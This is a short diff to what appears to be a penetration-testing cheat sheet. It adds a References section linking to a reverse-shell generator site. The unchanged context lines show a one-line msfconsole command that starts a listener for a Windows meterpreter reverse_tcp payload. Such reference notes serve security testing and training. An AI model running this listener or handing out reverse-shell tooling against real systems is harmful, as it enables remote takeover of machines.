@@ -125,3 +125,9 @@ Start meterpreter listener one-liner
 ```bash
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <LHOST>;set LPORT <LPORT>;run;"
 ```
+
+## References
+
+{% embed url="https://www.revshells.com/" %}
+revshell generator
+{% endembed %}
